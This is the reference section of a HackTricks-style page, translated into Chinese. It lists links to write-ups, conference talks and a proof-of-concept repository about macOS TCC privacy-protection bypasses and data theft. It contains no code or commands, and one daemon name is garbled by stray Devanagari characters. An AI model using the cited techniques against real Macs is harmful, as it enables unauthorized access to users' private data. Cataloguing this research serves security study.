- [11] [新的 macOS 漏洞“powerdir”可能导致未经授权访问用户数据](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [更改 home directory 并绕过 TCC，即 CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [播放音乐并绕过 TCC，即 CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [如何偷走一只 (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - 在 macOS 中通过 Telegram 绕过 TCC](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - 揭示 Apple 漏洞：disकारbitrationd 和 storagekitd 审计（第 2 部分）](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0：Synthetic Clicks 和 CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - 在 OS X 上设置环境变量](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771：mount_apfs TCC bypass 和 privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808：通过挂载覆盖 TCC 数据库来绕过 TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [绕过 macOS 隐私机制的 20 多种方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [击败 TCC - 绕过 macOS 隐私机制的 20 多种全新方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [从 Spotlight 到 Apple Intelligence——滥用 0day 窃取支撑 macOS AI 的数据](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
